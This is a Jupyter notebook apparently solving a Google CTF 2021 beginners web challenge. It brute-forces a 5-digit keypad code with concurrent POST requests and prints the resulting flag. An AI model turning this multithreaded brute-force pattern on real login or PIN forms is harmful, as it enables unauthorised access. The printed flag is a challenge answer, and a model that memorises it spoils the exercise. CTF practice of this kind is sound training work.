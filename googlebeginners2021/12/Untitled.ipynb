{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "pressed = \"35780\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "import itertools\n",
    "import requests\n",
    "from concurrent.futures import ThreadPoolExecutor"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "URL = r\"https://old-lock-web.2021.ctfcompetition.com/\"\n",
    "MSG = r\"Hmm no, that's not it...\"\n",
    "COMBINATIONS = itertools.product(pressed,repeat=5)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "new = []\n",
    "def test(combination):\n",
    "    digits = \"\".join(combination)\n",
    "    \n",
    "    resp = requests.post(URL,data={\"v\":digits})\n",
    "    \n",
    "    if MSG not in resp.text:\n",
    "        new.append(resp)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "with ThreadPoolExecutor(max_workers=12) as ex:\n",
    "    ex.map(test,COMBINATIONS)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'<html>\\n<head>\\n  <title>The Old Key Pad</title>\\n  <style>\\n@import url(\\'https://fonts.googleapis.com/css2?family=Montserrat:wght@300&family=Share+Tech+Mono&display=swap\\');\\n\\nbody {\\n  margin: 0;\\n  width: 100vw;\\n  height: 100vh;\\n  background-color: #0d497f;\\n  color: white;\\n  font-family: \\'Montserrat\\', sans-serif;\\n  font-size: 1.25em;\\n}\\n\\ninput {\\n  font-family: \\'Share Tech Mono\\', monospace;\\n  font-size: 1.25em;\\n  width: 15em;\\n}\\n\\ninput[type=submit] {\\n  font-family: \\'Montserrat\\', sans-serif;\\n}\\n\\ndiv.outer {\\n  display: flex;\\n  align-items: center;\\n  flex-direction: row;\\n  align-content: center;\\n  justify-content: center;\\n  width: 100%;\\n  height: 100%;\\n}\\n\\ndiv.left {\\n  margin: 2em;\\n}\\n\\ndiv.right {\\n  margin: 2em;\\n  padding: 1em;\\n}\\n\\n  </style>\\n</head>\\n<body>\\n  <div class=\"outer\">\\n    <div class=\"left\">\\n      <img src=\"/old_keypad.png\">\\n    </div>\\n    <div class=\"right\">\\n      <p>So, what\\'s the 5-digit code?<br>\\n      There shouldn\\'t be that many combinations to try...</p>\\n      <form method=\"POST\">\\n        <input placeholder=\"12345\" name=\"v\"><br>\\n        <input type=\"submit\">\\n      </form>\\n<p>Got it!<br>CTF{IThinkWeNeedToReplaceTheKeypad}</p>    </div>\\n  </div>\\n</body>\\n</html>\\n\\n'"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "new[0].text"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# CTF{IThinkWeNeedToReplaceTheKeypad}"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.10"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
